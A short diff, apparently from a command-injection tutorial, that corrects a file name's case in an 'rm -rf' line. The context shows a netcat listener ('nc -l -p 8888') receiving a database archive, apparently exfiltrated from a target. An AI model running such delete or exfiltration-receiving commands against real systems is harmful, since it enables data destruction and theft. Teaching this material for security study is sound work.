@@ -34,7 +34,7 @@ Command injection is an attack in which the goal is execution of arbitrary comma
 
        cd /home/kali
        ls
-       rm -rf Sample-Db.zip
+       rm -rf Sample-DB.zip
        ls
        nc -l -p 8888 > Sample-DB.zip
 
